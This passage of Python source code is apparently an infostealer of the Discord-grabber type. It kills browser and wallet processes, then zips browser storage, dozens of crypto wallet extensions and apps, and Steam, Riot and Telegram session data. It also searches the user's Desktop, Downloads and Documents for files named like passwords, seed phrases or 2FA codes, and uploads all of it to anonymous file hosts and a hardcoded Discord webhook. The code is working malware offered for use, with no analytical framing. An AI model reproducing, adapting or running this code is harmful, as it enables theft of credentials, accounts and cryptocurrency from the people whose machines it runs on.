    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

def ZipTelegram(path, arg, procc):

    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)
    zipfolder(name, pathC)

    for i in range(3):
        lnik = uploadToAnonfiles(f'{temp}/{name}.zip')
        if "https://" in str(lnik):
            break
        time.sleep(4)
    os.remove(f"{temp}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    
    global WalletsZip, GamingZip, OtherZip
    for walllts in wallts:
        if str(walllts[0]) in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"{str(walllts[1])}_{browser}"
            pathC = path + arg

    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zipfolder(name, pathC) 

    for i in range(3):
        lnik = uploadToAnonfiles(f'{temp}/{name}.zip')
        if "https://" in str(lnik):break
        time.sleep(4)

    os.remove(f"{temp}/{name}.zip")
    if "/Local Extension Settings/" in arg or "/HougaBouga/"  in arg or "wallet" in arg.lower():
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])

def Startthread(meth, args):
    a = threading.Thread(target=meth, args=args)
    a.start()
    Threadlist.append(a)

def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                 Password/CC < 3 >     Cookies < 4 >                 Extentions < 5 >                           '
    browserPaths = [    
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
    ]

    discordPaths = [
        [f"{roaming}/discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb",                             "Atomic Wallet.exe",        "Wallet"        ],
        [f"{roaming}/Zcash",                                                    '"Zcash.exe"',              "Wallet"        ],
        [f"{roaming}/Armory",                                                   '"Armory.exe"',             "Wallet"        ],
        [f"{roaming}/bytecoin",                                                 '"bytecoin.exe"',           "Wallet"        ],
        [f"{roaming}/Exodus/exodus.wallet",                                     "Exodus.exe",               "Wallet"        ],
        [f"{roaming}/Binance/Local Storage/leveldb",                            "Binance.exe",              "Wallet"        ],
        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",     '"Jaxx.exe"',               "Wallet"        ],
        [f"{roaming}/Electrum/wallets",                                         'Electrum.exe',             "Wallet"        ],
        [f"{roaming}/Coinomi/Coinomi/wallets",                                  '"Coinomi.exe"',            "Wallet"        ],
        ["C:\Program Files (x86)\Steam\config",                                 "steam.exe",                "Steam"         ],
        [f"{roaming}/NationsGlory/Local Storage/leveldb",                       "NationsGlory.exe",         "NationsGlory"  ],
        [f"{local}/Riot Games/Riot Client/Data",                                "RiotClientServices.exe",   "RiotClient"    ],
        [f"{roaming}/Ethereum/keystore",'"Ethereum.exe"','Wallet'],
        [f"{roaming}/Guarda/Local Storage/leveldb",'"Guarda.exe"','Wallet'],
        [f"{roaming}/Coin Wallet/Local Storage/leveldb", 'Coin Wallet.exe"', "Wallet"],
        [f"{roaming}/Bitcoin/wallets", 'Bitcoin.exe"', "Wallet"],
        [f"{roaming}/WalletWasabi/Client/Wallets", 'WalletWasabi.exe"', "Wallet"],
        [f"{roaming}/Litecoin/wallets", 'Litecoin.exe"', "Wallet"],
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'Telegram.exe', "Telegram"]


    for patt in browserPaths:
        Startthread(getToken, [patt[0], patt[2]])
    for patt in discordPaths:
        Startthread(GetDiscord, [patt[0], patt[1]])
    Startthread(getBrowsers, [browserPaths,])
    Startthread(GatherZips, [browserPaths, PathsToZip, Telegram])
    Startthread(ngstealer, [f"{roaming}/NationsGlory/Local Storage/leveldb"])

    for thread in Threadlist:
        thread.join()


def uploadToAnonfiles(path):
    try:
        response = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')})
        data = response.json()
        result = data["data"]["downloadPage"]
        return result
    except:
        return uploadToAnonfiles2(path)


def uploadToAnonfiles2(path):
    try:
        response = requests.post('https://api.anonfiles.com/upload', files={'file': open(path, 'rb')})
        data = response.json()
        result = data['data']['file']['url']['short']
        return result
    except:
        return uploadToAnonfiles3(path)



def uploadToAnonfiles3(path):
    try:
        files = { "file": (path, open(path, mode='rb')) }
        upload = requests.post("https://transfer.sh/", files=files)
        url = upload.text
        return url
    except:
        return False


def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:break
    KiwiFiles.append(["folder", pathF + "/", ffound])

def KiwiFile(path, keywords, fileendings):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and file.endswith(tuple(fileendings)):
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user    + "/Desktop",
        user    + "/Downloads",
        user    + "/Documents",
        roaming + "/Microsoft/Windows/Recent",
    ]

    key_wordsFolder = [
        "account",
        "bot",
        "token",
        "acount",
        "exodus",
        "wallet",
        "backup",
        "atomic",
        "metam",
        "passw",
        "secret"
        "passwords",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "seed",
        "login",
        "secret",
        "nft",
        "valorant",
        "combo",
        "paypal",
        "banque",
        "github",
        "metamask",
        "crypto",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "wasp"
        "toke",
        "mnemonic",
        "private",
        "key",
        "passphrase",
        "pass",
        "phrase",
        "steal",
    ]

    key_wordsFiles = [
        "account",
        "bot",
        "token",
        "acount",
        "exodus",
        "wallet",
        "backup",
        "atomic",
        "metam",
        "passw",
        "secret"
        "passwords",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "seed",
        "login",
        "secret",
        "nft",
        "valorant",
        "combo",
        "paypal",
        "banque",
        "github",
        "metamask",
        "crypto",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "wasp"
        "toke",
        "mnemonic",
        "private",
        "key",
        "passphrase",
        "pass",
        "phrase",
        "steal",
    ]
    
    fileendings = [
        ".txt",
        ".js",
        ".doc",
        ".zip",
        ".rar",
        ".png",
        ".jpg",
        ".mp4",
        ".docx",
        ".pdf",
        ".json",
        ".xml",
        ".py",
        ".exe",
        ".pyc",
        ".pyw"
    ]
    wikith = []
    for patt in path2search:
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles, fileendings])
        kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip, Threadlist

hook = "https://discord.com/api/webhooks/1052767605989056562/7p9oTa7QdN-G6rLxy6ZBO_qwd-gnSu8JQBpbV7NoEW1vDsQQQYPmof_hh_LCWe_97Xq9"
DETECTED = False
wallts = [
    ["nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"         ],
    ["ejbalbakoplchlghecdalmeeeajnimhm", "Metamask"         ],
    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"          ],
    ["hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"         ],
    ["fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"            ],
    ["ibnejdfjmmkpcnlpebklmnkoeoihofec", "Tron"             ],
    ["ejjladinnckdgjemekebdpeokbikhfci", "Petra"            ],
    ["ldcoohedfbjoobcadoglnnmmfbdlmmhf", "Frame"            ],
    ["efbglgofoippbgcjepnhiblaibcnclgk", "Martian"          ],
    ["phkbamefinggmakgklpkljjmgibohnba", "Pontem"           ],
    ["ebfidpplhabeedpnhjnobghokpiioolj", "Fewcha"           ],
    ["afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math"             ],
    ["aeachknmefphepccionboohckonoeemg", "Coin98"           ],
    ["bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"    ],
    ["aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb3"       ],
    ["ojbcfhjmpigfobfclfflafhblgemeidi", "Glow"       ],
    ["oppceojapmdmhpnmjpballbbdclocdhj", "Apex"       ],
    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"          ],
    ["agoakfejjabomempkjlepdflaleeobhb", "Core"             ],
    ["mfgccjchihfkkindfppnaooecgfneiii", "Tokenpocket"      ],
    ["lgmpcpglpngdoalbgeoldeajfclnhafa", "Safepal"          ],
    ["bhhhlbepdkbapadjdnnojkbgioiodbic", "Solfare"          ],
    ["jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"           ],
    ["kncchdigobghenbbaddojjnnaogfppfj", "iWallet"          ],
    ["ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"            ],
    ["hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"           ],
    ["cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"     ],
    ["amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"           ],
    ["fhilaheimglignddkjgofkcbgekhenbh", "Oxygen"           ],
    ["nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEWCX"            ],
    ["nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"            ], # i get 404 but its the correct id
    ["nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"           ], # same here
    ["aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation"     ],
    ["fnnegphlobjdpkhecapkijjdkgcjhkib", "HarmonyOutdated"  ],
    ["cgeeodpfagjceefieflmdfphplkenlfk", "Ever"             ],
    ["pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"      ],
    ["mgffkfbidihjpoaomajlbgchddlicgpn", "PaliWallet"       ],
    ["aodkkagnadcbobfpggfnjeongemjbjca", "BoltX"            ],
    ["kpfopkelmapcoipemfendmdcghnegimn", "Liquality"        ],
    ["hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"            ],
    ["lpfcbjknijpeeillifnkikgncikgfhdo", "Nami"             ],
    ["dngmlblcodfobpdpecaadgfbcggfjfnm", "MaiarDEFI"        ],
    ["ookjlbkiijinhpmnjffcofjonbfbgaoc", "TempleTezos"      ],
    ["eigblbgjknlfbajkfhopmcojidlgcehm", "XMR.PT"           ],
]
IP = getip()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

keyword = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[gmail](https://gmail.com)']
CookiCount, PasswCount, CCsCount, AutofillCount, HistoryCount, BookmarksCount = 0, 0, 0, 0, 0, 0
cookiWords, paswWords, History, CCs, Passw, Autofill, Cookies, WalletsZip, GamingZip, OtherZip, Threadlist, KiwiFiles, Bookmarks, Tokens = [], [], [], [], [], [], [], [], [], [], [], [], [], ''

try:gofileserver = json_loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
except:gofileserver = "store4"
GLINFO = globalInfo()
GatherAll()
DETECTED = Trust(Cookies)
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1].replace("\\", "/")
            foldlist = arg[2]
            filetext += f"{foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f":open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)
